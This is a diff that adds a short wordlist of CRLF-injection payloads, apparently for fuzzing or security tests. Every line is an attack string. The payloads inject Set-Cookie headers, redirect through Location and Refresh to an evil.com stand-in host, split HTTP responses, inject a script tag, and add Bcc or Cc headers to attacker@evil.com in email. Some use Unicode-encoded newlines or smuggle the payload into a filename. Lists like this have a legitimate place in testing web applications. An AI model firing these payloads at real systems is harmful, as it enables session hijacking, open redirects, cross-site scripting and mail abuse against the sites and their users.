@@ -1,0 +1,20 @@
+%0d%0aSet-Cookie:%20x=1
+%0aSet-Cookie:%20x=1
+%0d%0aLocation:%20//evil.com
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
+%0d%0aX-XSS-Protection:%200
+%0d%0a%0d%0a<script>alert(1)</script>
+%E5%98%8A%E5%98%8DSet-Cookie:%20x=1
+%E5%98%8A%E5%98%8DLocation:%20//evil.com
+\r\nSet-Cookie: x=1
+\nSet-Cookie: x=1
+%0d%0aSet-Cookie:%20x=1%3b%20SameSite=None
+%0d%0aRefresh:%200%3burl=//evil.com
+%0d%0aBcc: attacker@evil.com
+%0d%0aCc: attacker@evil.com
+%0d%0aSubject:%20injected
+a%0d%0aBcc:attacker@evil.com
+file%0d%0aSet-Cookie:%20x=1.txt
+line1%0d%0aline2
+%0d%0a%09injected
+%0d%0a%20injected
